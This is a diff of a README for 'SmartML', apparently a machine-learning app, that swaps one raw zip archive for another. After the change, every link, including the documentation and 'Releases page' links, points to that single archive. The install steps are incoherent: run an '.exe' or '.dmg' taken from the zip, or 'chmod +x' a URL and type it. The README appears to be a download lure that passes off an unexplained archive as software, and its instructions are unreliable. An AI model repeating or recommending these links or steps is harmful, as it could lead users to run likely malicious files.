@@ -1,6 +1,6 @@
 # 🌟 SmartML - Unlock the Power of Machine Learning
 
-[![Download SmartML](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip%https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
+[![Download SmartML](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip%https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip)](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip)
 
 ## 📦 What is SmartML?
 
@@ -21,19 +21,19 @@ Before you get started, make sure your computer meets the following requirements
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page**: Click [here to access the SmartML Releases page](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip).
+1. **Visit the Download Page**: Click [here to access the SmartML Releases page](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip).
 
 2. **Select the Latest Release**: Look for the latest version, which often appears at the top of the page.
 
 3. **Download the File**: You will see files available for download. Choose the version that matches your operating system. For example:
-   - **Windows**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip`
-   - **macOS**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip`
-   - **Linux**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip`
+   - **Windows**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip`
+   - **macOS**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip`
+   - **Linux**: Click on `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip`
 
 4. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the instructions provided in the setup wizard.
    - **macOS**: Open the `.dmg` file, drag the SmartML application to your Applications folder, and then open it.
-   - **Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run the command `chmod +x https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip` to make it executable. Then, type `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip` to start the installation.
+   - **Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run the command `chmod +x https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip` to make it executable. Then, type `https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip` to start the installation.
 
 5. **Follow On-Screen Instructions**: Complete the installation by following the prompts. Once finished, the application will be ready for use.
 
@@ -88,9 +88,9 @@ For further exploration, visit the official SmartML repository. Be sure to check
 
 ## ⭐ Additional Resources
 
-- [SmartML Documentation](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
-- [Machine Learning Basics](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
+- [SmartML Documentation](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip)
+- [Machine Learning Basics](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip)
 
 Download SmartML today and start your journey in the world of machine learning!
 
-[![Download SmartML](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip%https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/ML-Smart-v3.6.zip)
+[![Download SmartML](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip%https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip)](https://raw.githubusercontent.com/nebilcan/SmartML/main/SmartEco/SmartML/models/Smart-ML-subdepot.zip)
